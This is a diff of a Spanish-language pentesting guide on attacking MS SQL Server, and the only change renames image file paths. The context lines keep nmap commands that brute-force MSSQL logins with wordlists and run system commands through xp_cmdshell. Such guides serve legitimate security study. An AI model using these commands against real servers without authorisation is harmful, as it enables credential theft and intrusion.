@@ -10,7 +10,7 @@ Podemos hacer uso de Nmap para hacerle fuerza bruta a este servicio:
 nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 192.168.1.1
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Metasploit
 
@@ -47,7 +47,7 @@ Podemos hacer uso del comando "type" para leer archivos de la maquina
 nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=usuario,mssql.password=contraseña,ms-sql-xp-cmdshell.cmd="whoami" 192.168.1.1
 ```
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Metasploit
 
